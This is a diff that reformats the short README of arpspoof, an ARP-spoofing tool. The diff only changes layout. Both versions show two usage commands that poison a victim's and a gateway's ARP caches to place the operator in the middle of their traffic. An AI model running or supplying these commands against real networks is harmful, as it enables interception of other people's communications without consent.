@@ -1,11 +1,13 @@
-README for arpspoof
+-=[ README for arpspoof ]=-
 
 
 NOTES
+=====
 
-Basic spoofing usage:
-arpspoof -i ${IFACE} -t ${VICTIM_IP} ${GW_IP} &
-arpspoof -i ${IFACE} -t ${GW_IP} ${VICTIM_IP} &
+  Basic spoofing usage:
+
+    arpspoof -i ${IFACE} -t ${VICTIM_IP} ${GW_IP} &
+    arpspoof -i ${IFACE} -t ${GW_IP} ${VICTIM_IP} &
 
 
 End of file.
